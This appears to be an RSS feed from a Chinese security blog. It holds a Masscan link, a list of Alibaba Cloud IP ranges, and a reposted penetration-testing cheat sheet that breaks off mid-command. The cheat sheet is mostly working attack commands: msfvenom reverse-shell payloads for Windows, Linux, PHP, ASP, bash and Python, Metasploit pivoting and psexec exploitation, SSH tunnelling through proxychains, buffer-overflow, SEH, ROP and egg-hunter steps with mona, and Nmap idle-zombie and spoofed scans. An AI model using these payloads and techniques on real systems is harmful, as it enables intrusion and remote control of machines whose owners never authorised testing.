<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Hackers on 时光小栈</title>
        <link>http://blog.pytool.com/hacker/</link>
        <language>zh-CN</language>
        <author>rinetd</author>
        <rights>Copyright (c) 2015, rinetd; all rights reserved.</rights>
        <updated>Sat, 29 Oct 2016 03:22:16 CST</updated>
        
        <item>
            <title>Masscan：最快的互联网IP端口扫描器</title>
            <link>http://blog.pytool.com/hacker/01_%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/2016-10-29-masscan/</link>
            <pubDate>Sat, 29 Oct 2016 03:22:16 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/01_%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/2016-10-29-masscan/</guid>
            <description>&lt;p&gt;&lt;a href=&#34;http://www.freebuf.com/sectool/112583.html&#34; target=&#34;_blank&#34;&gt;原文连接&lt;/a&gt;
Masscan：最快的互联网IP端口扫描器&lt;/p&gt;
</description>
        </item>
        
        <item>
            <title>阿里云IP段</title>
            <link>http://blog.pytool.com/hacker/ip%E6%AE%B5/2015-03-29-aliyun/</link>
            <pubDate>Tue, 27 Sep 2016 15:32:22 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/ip%E6%AE%B5/2015-03-29-aliyun/</guid>
            <description>&lt;p&gt;[](&lt;a href=&#34;https://bbs.aliyun.com/read/281157.html&#34; target=&#34;_blank&#34;&gt;https://bbs.aliyun.com/read/281157.html&lt;/a&gt;)
101.200.0.0/15&lt;br /&gt;
101.37.0.0/16&lt;br /&gt;
101.37.0.0/17&lt;br /&gt;
101.37.0.0/24&lt;br /&gt;
101.37.128.0/17&lt;/p&gt;

&lt;p&gt;103.52.196.0/22&lt;br /&gt;
103.52.196.0/23&lt;br /&gt;
103.52.196.0/24&lt;br /&gt;
103.52.198.0/23&lt;br /&gt;
106.11.0.0/16&lt;br /&gt;
106.11.0.0/17&lt;br /&gt;
106.11.0.0/18&lt;br /&gt;
106.11.1.0/24&lt;br /&gt;
106.11.128.0/17&lt;br /&gt;
106.11.32.0/22&lt;br /&gt;
106.11.36.0/22&lt;br /&gt;
106.11.48.0/21&lt;br /&gt;
106.11.56.0/21&lt;br /&gt;
106.11.64.0/19&lt;br /&gt;
110.173.192.0/20&lt;br /&gt;
110.173.196.0/24&lt;br /&gt;
110.173.208.0/20&lt;br /&gt;
110.75.0.0/16&lt;br /&gt;
110.75.236.0/22&lt;br /&gt;
110.75.239.0/24&lt;br /&gt;
110.75.240.0/20&lt;br /&gt;
110.75.242.0/24&lt;br /&gt;
110.75.243.0/24&lt;br /&gt;
110.75.244.0/22&lt;br /&gt;
110.76.0.0/19&lt;br /&gt;
110.76.21.0/24&lt;br /&gt;
110.76.32.0/20&lt;br /&gt;
110.76.48.0/20&lt;br /&gt;
112.124.0.0/16&lt;br /&gt;
112.125.0.0/16&lt;br /&gt;
112.126.0.0/16&lt;br /&gt;
112.127.0.0/16&lt;br /&gt;
112.74.0.0/16&lt;br /&gt;
112.74.0.0/17&lt;br /&gt;
112.74.116.0/22&lt;br /&gt;
112.74.120.0/22&lt;br /&gt;
112.74.128.0/17&lt;br /&gt;
112.74.32.0/19&lt;br /&gt;
112.74.64.0/22&lt;br /&gt;
112.74.68.0/22&lt;br /&gt;
114.215.0.0/16&lt;br /&gt;
114.55.0.0/16&lt;br /&gt;
114.55.0.0/17&lt;br /&gt;
114.55.128.0/17&lt;br /&gt;
115.124.16.0/22&lt;br /&gt;
115.124.20.0/22&lt;br /&gt;
115.124.24.0/21&lt;br /&gt;
115.28.0.0/16&lt;br /&gt;
115.29.0.0/16&lt;br /&gt;
118.190.0.0/16&lt;br /&gt;
118.190.0.0/17&lt;br /&gt;
118.190.0.0/24&lt;br /&gt;
118.190.128.0/17&lt;br /&gt;
118.31.0.0/16&lt;br /&gt;
118.31.0.0/17&lt;br /&gt;
118.31.0.0/24&lt;br /&gt;
118.31.128.0/17&lt;br /&gt;
119.38.208.0/21&lt;br /&gt;
119.38.216.0/21&lt;br /&gt;
119.38.219.0/24&lt;br /&gt;
119.42.224.0/20&lt;br /&gt;
119.42.242.0/23&lt;br /&gt;
119.42.244.0/22&lt;br /&gt;
119.42.248.0/21&lt;br /&gt;
120.24.0.0/14&lt;br /&gt;
120.24.0.0/15&lt;br /&gt;
120.25.0.0/18&lt;br /&gt;
120.25.104.0/22&lt;br /&gt;
120.25.108.0/24&lt;br /&gt;
120.25.110.0/24&lt;br /&gt;
120.25.111.0/24&lt;br /&gt;
120.25.112.0/23&lt;br /&gt;
120.25.115.0/24&lt;br /&gt;
120.25.136.0/22&lt;br /&gt;
120.25.64.0/19&lt;br /&gt;
120.25.96.0/21&lt;br /&gt;
120.27.0.0/17&lt;br /&gt;
120.27.128.0/17&lt;br /&gt;
120.27.128.0/18&lt;br /&gt;
120.27.192.0/18&lt;br /&gt;
120.55.0.0/16&lt;br /&gt;
120.76.0.0/15&lt;br /&gt;
120.76.0.0/16&lt;br /&gt;
120.77.0.0/16&lt;br /&gt;
120.78.0.0/15&lt;br /&gt;
121.0.16.0/21&lt;br /&gt;
121.0.24.0/22&lt;br /&gt;
121.0.28.0/22&lt;br /&gt;
121.196.0.0/16&lt;br /&gt;
121.197.0.0/16&lt;br /&gt;
121.198.0.0/16&lt;br /&gt;
121.199.0.0/16&lt;br /&gt;
121.40.0.0/14&lt;br /&gt;
121.42.0.0/18&lt;br /&gt;
121.42.0.0/24&lt;br /&gt;
121.42.128.0/18&lt;br /&gt;
121.42.17.0/24&lt;br /&gt;
121.42.192.0/19&lt;br /&gt;
121.42.224.0/19&lt;br /&gt;
121.42.64.0/18&lt;br /&gt;
123.56.0.0/15&lt;br /&gt;
123.56.0.0/16&lt;br /&gt;
123.57.0.0/16&lt;br /&gt;
139.129.0.0/16&lt;br /&gt;
139.129.0.0/17&lt;br /&gt;
139.129.128.0/17&lt;br /&gt;
139.196.0.0/16&lt;br /&gt;
139.196.0.0/17&lt;br /&gt;
139.196.128.0/17&lt;br /&gt;
139.224.0.0/16&lt;br /&gt;
139.224.0.0/17&lt;br /&gt;
139.224.128.0/17&lt;br /&gt;
140.205.0.0/16&lt;br /&gt;
140.205.128.0/18&lt;br /&gt;
140.205.192.0/18&lt;br /&gt;
140.205.32.0/19&lt;br /&gt;
140.205.76.0/24&lt;br /&gt;
182.92.0.0/16&lt;br /&gt;
203.107.0.0/24&lt;br /&gt;
203.107.1.0/24&lt;br /&gt;
203.209.224.0/19&lt;br /&gt;
218.244.128.0/19&lt;br /&gt;
223.4.0.0/16&lt;br /&gt;
223.5.0.0/16&lt;br /&gt;
223.5.5.0/24&lt;br /&gt;
223.6.0.0/16&lt;br /&gt;
223.6.6.0/24&lt;br /&gt;
223.7.0.0/16&lt;br /&gt;
39.100.0.0/14&lt;br /&gt;
39.104.0.0/14&lt;br /&gt;
39.104.0.0/15&lt;br /&gt;
39.104.0.0/24&lt;br /&gt;
39.106.0.0/15&lt;br /&gt;
39.108.0.0/16&lt;br /&gt;
39.108.0.0/17&lt;br /&gt;
39.108.0.0/24&lt;br /&gt;
39.108.128.0/17&lt;br /&gt;
39.96.0.0/13&lt;br /&gt;
39.96.0.0/14&lt;br /&gt;
39.96.0.0/24&lt;br /&gt;
42.120.0.0/16&lt;br /&gt;
42.121.0.0/16&lt;br /&gt;
42.156.128.0/17&lt;br /&gt;
42.96.128.0/17&lt;br /&gt;
45.113.40.0/22&lt;br /&gt;
45.113.40.0/23&lt;br /&gt;
45.113.40.0/24&lt;br /&gt;
45.113.42.0/23&lt;br /&gt;
47.92.0.0/14&lt;br /&gt;
47.92.0.0/15&lt;br /&gt;
47.92.0.0/24&lt;br /&gt;
47.94.0.0/15&lt;/p&gt;
</description>
        </item>
        
        <item>
            <title>渗透测试工具实战技巧合集</title>
            <link>http://blog.pytool.com/hacker/%E7%B2%BE%E5%8D%8E/2016-07-06-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7%E5%90%88%E9%9B%86/</link>
            <pubDate>Sat, 02 Jul 2016 15:09:22 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/%E7%B2%BE%E5%8D%8E/2016-07-06-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7%E5%90%88%E9%9B%86/</guid>
            <description>

&lt;p&gt;&lt;a href=&#34;http://www.freebuf.com/sectool/105524.html&#34; target=&#34;_blank&#34;&gt;渗透测试工具实战技巧合集 - FreeBuf.COM | 关注黑客与极客&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;最好的 NMAP 扫描策略&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# 适用所有大小网络最好的 nmap 扫描策略  

# 主机发现，生成存活主机列表  
$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24  
$ grep &amp;quot;Status: Up&amp;quot; Discovery.gnmap | cut -f 2 -d &#39; &#39; &amp;gt; LiveHosts.txt  

# 端口发现，发现大部分常用端口  
# http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf  
$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt  
$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt  
$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt  

# 端口发现，发现全部端口，但 UDP 端口的扫描会非常慢  
$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt  
$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt  

# 显示 TCP\UDP 端口  
$ grep &amp;quot;open&amp;quot; FullTCP|cut -f 1 -d &#39; &#39; | sort -nu | cut -f 1 -d  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw&lt;/p&gt;

&lt;p&gt;Kali 下编译 Exploit&lt;/p&gt;

&lt;p&gt;gcc -m32 -o output32 hello.c (32 位)&lt;br /&gt;
gcc -m64 -o output hello.c (64 位)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Kali 下编译 Windows Exploit  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;wget -O mingw-get-setup.exe &lt;a href=&#34;http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download&#34; target=&#34;_blank&#34;&gt;http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download&lt;/a&gt;&lt;br /&gt;
wine mingw-get-setup.exe&lt;br /&gt;
select mingw32-base&lt;br /&gt;
cd /root/.wine/drive_c/windows&lt;br /&gt;
wget &lt;a href=&#34;http://gojhonny.com/misc/mingw_bin.zip&#34; target=&#34;_blank&#34;&gt;http://gojhonny.com/misc/mingw_bin.zip&lt;/a&gt; &amp;amp;&amp;amp; unzip mingw_bin.zip&lt;br /&gt;
cd /root/.wine/drive_c/MinGW/bin&lt;br /&gt;
wine gcc -o ability.exe /tmp/exploit.c -lwsock32&lt;br /&gt;
wine ability.exe&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;NASM 命令  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注：NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。&lt;/p&gt;

&lt;p&gt;nasm -f bin -o payload.bin payload.asm&lt;br /&gt;
nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SSH 穿透  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ssh -D 127.0.0.1:1080 -p 22 user@IP&lt;br /&gt;
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf&lt;br /&gt;
proxychains commands target&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SSH 穿透从一个网络到另一个网络  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ssh -D 127.0.0.1:1080 -p 22 user1@IP1&lt;br /&gt;
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf&lt;br /&gt;
proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2&lt;br /&gt;
Add socks4 127.0.0.1 1081 in /etc/proxychains.conf&lt;br /&gt;
proxychains commands target&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 metasploit 进行穿透  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;route add X.X.X.X 255.255.255.0 1&lt;br /&gt;
use auxiliary/server/socks4a&lt;br /&gt;
run&lt;br /&gt;
proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;或者  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;https-www-offensive-security-com-metasploit-unleashed-pivoting&#34;&gt;&lt;a href=&#34;https://www.offensive-security.com/metasploit-unleashed/pivoting/&#34; target=&#34;_blank&#34;&gt;https://www.offensive-security.com/metasploit-unleashed/pivoting/&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;meterpreter &amp;gt; ipconfig&lt;br /&gt;
IP Address  : 10.1.13.3&lt;br /&gt;
meterpreter &amp;gt; run autoroute -s 10.1.13.0/24&lt;br /&gt;
meterpreter &amp;gt; run autoroute -p&lt;br /&gt;
10.1.13.0          255.255.255.0      Session 1&lt;br /&gt;
meterpreter &amp;gt; Ctrl+Z&lt;br /&gt;
msf auxiliary(tcp) &amp;gt; use exploit/windows/smb/psexec&lt;br /&gt;
msf exploit(psexec) &amp;gt; set RHOST 10.1.13.2&lt;br /&gt;
msf exploit(psexec) &amp;gt; exploit&lt;br /&gt;
meterpreter &amp;gt; ipconfig&lt;br /&gt;
IP Address  : 10.1.13.2&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;基于 CSV 文件查询 Exploit-DB  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;git clone &lt;a href=&#34;https://github.com/offensive-security/exploit-database.git&#34; target=&#34;_blank&#34;&gt;https://github.com/offensive-security/exploit-database.git&lt;/a&gt;&lt;br /&gt;
cd exploit-database&lt;br /&gt;
./searchsploit –u&lt;br /&gt;
./searchsploit apache 2.2&lt;br /&gt;
./searchsploit &amp;ldquo;Linux Kernel&amp;rdquo;&lt;/p&gt;

&lt;p&gt;cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep &amp;ldquo;&amp;lt;|&amp;lt;=&amp;rdquo; | sort -k3&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF Payloads  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &amp;gt; system.exe&lt;br /&gt;
msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &amp;gt; exploit.php&lt;br /&gt;
msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 &amp;ndash;platform win -f asp -o file.asp&lt;br /&gt;
msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &amp;ldquo;\x00&amp;rdquo; -a x86 &amp;ndash;platform win -f c&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF 生成在 Linux 下反弹的 Meterpreter Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 &amp;ndash;platform linux -o shell&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF 生成反弹 Shell (C Shellcode)  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &amp;ldquo;\x00\x0a\x0d&amp;rdquo; -a x86 &amp;ndash;platform win -f c&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF 生成反弹 Python Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF 生成反弹 ASP Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 &amp;ndash;platform win -o shell.asp&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF 生成反弹 Bash Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF 生成反弹 PHP Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.php&lt;br /&gt;
add &amp;lt;?php at the beginning&lt;br /&gt;
perl -i~ -0777pe&amp;rsquo;s/^/&amp;lt;?php \n/&amp;rsquo; shell.php&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF 生成反弹 Win Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 &amp;ndash;platform win -o shell.exe&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Linux 常用安全命令  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;使用-uid-查找对应的程序&#34;&gt;使用 uid 查找对应的程序&lt;/h1&gt;

&lt;p&gt;find / -uid 0 -perm -4000&lt;/p&gt;

&lt;h1 id=&#34;查找哪里拥有写权限&#34;&gt;查找哪里拥有写权限&lt;/h1&gt;

&lt;p&gt;find / -perm -o=w&lt;/p&gt;

&lt;h1 id=&#34;查找名称中包含点和空格的文件&#34;&gt;查找名称中包含点和空格的文件&lt;/h1&gt;

&lt;p&gt;find / -name &amp;ldquo; &amp;rdquo; -print&lt;br /&gt;
find / -name &amp;ldquo;..&amp;rdquo; -print&lt;br /&gt;
find / -name &amp;ldquo;. &amp;rdquo; -print&lt;br /&gt;
find / -name &amp;ldquo; &amp;rdquo; -print&lt;/p&gt;

&lt;h1 id=&#34;查找不属于任何人的文件&#34;&gt;查找不属于任何人的文件&lt;/h1&gt;

&lt;p&gt;find / -nouser&lt;/p&gt;

&lt;h1 id=&#34;查找未链接的文件&#34;&gt;查找未链接的文件&lt;/h1&gt;

&lt;p&gt;lsof +L1&lt;/p&gt;

&lt;h1 id=&#34;获取进程打开端口的信息&#34;&gt;获取进程打开端口的信息&lt;/h1&gt;

&lt;p&gt;lsof -i&lt;/p&gt;

&lt;h1 id=&#34;看看-arp-表中是否有奇怪的东西&#34;&gt;看看 ARP 表中是否有奇怪的东西&lt;/h1&gt;

&lt;p&gt;arp -a&lt;/p&gt;

&lt;h1 id=&#34;查看所有账户&#34;&gt;查看所有账户&lt;/h1&gt;

&lt;p&gt;getent passwd&lt;/p&gt;

&lt;h1 id=&#34;查看所有用户组&#34;&gt;查看所有用户组&lt;/h1&gt;

&lt;p&gt;getent group&lt;/p&gt;

&lt;h1 id=&#34;列举所有用户的-crontabs&#34;&gt;列举所有用户的 crontabs&lt;/h1&gt;

&lt;p&gt;for user in $(getent passwd|cut -f1 -d:); do echo &amp;ldquo;### Crontabs for $user ####&amp;rdquo;; crontab -u $user -l; done&lt;/p&gt;

&lt;h1 id=&#34;生成随机密码&#34;&gt;生成随机密码&lt;/h1&gt;

&lt;p&gt;cat /dev/urandom| tr -dc ‘a-zA-Z0-9-&lt;em&gt;!@#$%^&amp;amp;*()&lt;/em&gt;+{}|:&amp;lt;&amp;gt;?=’|fold -w 12| head -n 4&lt;/p&gt;

&lt;h1 id=&#34;查找所有不可修改的文件&#34;&gt;查找所有不可修改的文件&lt;/h1&gt;

&lt;p&gt;find . | xargs -I file lsattr -a file 2&amp;gt;/dev/null | grep ‘^….i’&lt;/p&gt;

&lt;h1 id=&#34;使文件不可修改&#34;&gt;使文件不可修改&lt;/h1&gt;

&lt;p&gt;chattr -i file&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Windows 缓冲区溢出利用命令  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p windows/shell_bind_tcp -a x86 &amp;ndash;platform win -b &amp;ldquo;\x00&amp;rdquo; -f c&lt;br /&gt;
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 &amp;ndash;platform win -e x86/shikata_ga_nai -b &amp;ldquo;\x00&amp;rdquo; -f c&lt;/p&gt;

&lt;p&gt;COMMONLY USED BAD CHARACTERS:&lt;br /&gt;
\x00\x0a\x0d\x20                              For http request&lt;br /&gt;
\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)&lt;/p&gt;

&lt;h1 id=&#34;常用命令&#34;&gt;常用命令:&lt;/h1&gt;

&lt;p&gt;pattern create&lt;br /&gt;
pattern offset (EIP Address)&lt;br /&gt;
pattern offset (ESP Address)&lt;br /&gt;
add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )&lt;/p&gt;

&lt;p&gt;!pvefindaddr pattern_create 5000&lt;br /&gt;
!pvefindaddr suggest&lt;br /&gt;
!pvefindaddr modules&lt;br /&gt;
!pvefindaddr nosafeseh&lt;/p&gt;

&lt;p&gt;!mona config -set workingfolder C:\Mona\%p&lt;br /&gt;
!mona config -get workingfolder&lt;br /&gt;
!mona mod&lt;br /&gt;
!mona bytearray -b &amp;ldquo;\x00\x0a&amp;rdquo;&lt;br /&gt;
!mona pc 5000&lt;br /&gt;
!mona po EIP&lt;br /&gt;
!mona suggest&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SEH – 结构化异常处理  

注：SEH(“Structured Exception Handling”)，即结构化异常处理，是 windows 操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;https-en-wikipedia-org-wiki-microsoft-specific-exception-handling-mechanisms-seh&#34;&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH&#34; target=&#34;_blank&#34;&gt;https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;http-baike-baidu-com-view-243131-htm&#34;&gt;&lt;a href=&#34;http://baike.baidu.com/view/243131.htm&#34; target=&#34;_blank&#34;&gt;http://baike.baidu.com/view/243131.htm&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;!mona suggest&lt;br /&gt;
!mona nosafeseh&lt;br /&gt;
nseh=&amp;rdquo;\xeb\x06\x90\x90&amp;rdquo; (next seh chain)&lt;br /&gt;
iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ROP (DEP)  

注：ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。  

DEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;https-en-wikipedia-org-wiki-return-oriented-programming&#34;&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Return-oriented_programming&#34; target=&#34;_blank&#34;&gt;https://en.wikipedia.org/wiki/Return-oriented_programming&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;https-zh-wikipedia-org-wiki-e8-bf-94-e5-9b-9e-e5-af-bc-e5-90-91-e7-bc-96-e7-a8-8b&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B&#34; target=&#34;_blank&#34;&gt;https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;https-en-wikipedia-org-wiki-data-execution-prevention&#34;&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Data_Execution_Prevention&#34; target=&#34;_blank&#34;&gt;https://en.wikipedia.org/wiki/Data_Execution_Prevention&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;http-baike-baidu-com-item-dep-7694630&#34;&gt;&lt;a href=&#34;http://baike.baidu.com/item/DEP/7694630&#34; target=&#34;_blank&#34;&gt;http://baike.baidu.com/item/DEP/7694630&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;!mona modules&lt;br /&gt;
!mona ropfunc -m *.dll -cpb &amp;ldquo;\x00\x09\x0a&amp;rdquo;&lt;br /&gt;
!mona rop -m *.dll -cpb &amp;ldquo;\x00\x09\x0a&amp;rdquo; (auto suggest)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ASLR – 地址空间格局随机化  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;https-en-wikipedia-org-wiki-address-space-layout-randomization&#34;&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Address_space_layout_randomization&#34; target=&#34;_blank&#34;&gt;https://en.wikipedia.org/wiki/Address_space_layout_randomization&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;http-baike-baidu-com-view-3862310-htm&#34;&gt;&lt;a href=&#34;http://baike.baidu.com/view/3862310.htm&#34; target=&#34;_blank&#34;&gt;http://baike.baidu.com/view/3862310.htm&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;!mona noaslr&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;寻蛋(EGG Hunter)技术  

Egg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。– 参考自看雪论坛，更多详情可以查阅我在代码注释中增加的链接。  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;https-www-corelan-be-index-php-2010-01-09-exploit-writing-tutorial-part-8-win32-egg-hunting&#34;&gt;&lt;a href=&#34;https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/&#34; target=&#34;_blank&#34;&gt;https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;http-www-pediy-com-kssd-pediy12-116190-831793-45248-pdf&#34;&gt;&lt;a href=&#34;http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf&#34; target=&#34;_blank&#34;&gt;http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;http-www-fuzzysecurity-com-tutorials-expdev-4-html&#34;&gt;&lt;a href=&#34;http://www.fuzzysecurity.com/tutorials/expDev/4.html&#34; target=&#34;_blank&#34;&gt;http://www.fuzzysecurity.com/tutorials/expDev/4.html&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;!mona jmp -r esp&lt;br /&gt;
!mona egg -t lxxl&lt;br /&gt;
\xeb\xc4 (jump backward -60)&lt;br /&gt;
buff=lxxllxxl+shell&lt;br /&gt;
!mona egg -t &amp;lsquo;w00t&amp;rsquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GDB Debugger 常用命令  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;僵尸网络扫描-首先需要找到僵尸网络的ip&#34;&gt;僵尸网络扫描, 首先需要找到僵尸网络的IP&lt;/h1&gt;

&lt;p&gt;$ nmap -sI [Zombie IP] [Target IP]&lt;/p&gt;

&lt;h1 id=&#34;指定源端口号&#34;&gt;指定源端口号&lt;/h1&gt;

&lt;p&gt;$ nmap &amp;ndash;source-port 80 IP&lt;/p&gt;

&lt;h1 id=&#34;在每个扫描数据包后追加随机数量的数据&#34;&gt;在每个扫描数据包后追加随机数量的数据&lt;/h1&gt;

&lt;p&gt;$ nmap &amp;ndash;data-length 25 IP&lt;/p&gt;

&lt;h1 id=&#34;mac-地址欺骗-可以生成不同主机的-mac-地址&#34;&gt;MAC 地址欺骗，可以生成不同主机的 MAC 地址&lt;/h1&gt;

&lt;p&gt;$ nmap &amp;ndash;spoof-mac Dell/Apple/3Com IP&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Nmap 进行 Web 漏洞扫描  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;cd /usr/share/nmap/scripts/&lt;br /&gt;
wget &lt;a href=&#34;http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz&#34; target=&#34;_blank&#34;&gt;http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz&lt;/a&gt; &amp;amp;&amp;amp; tar xzf nmap_nse_vulscan-2.0.tar.gz&lt;br /&gt;
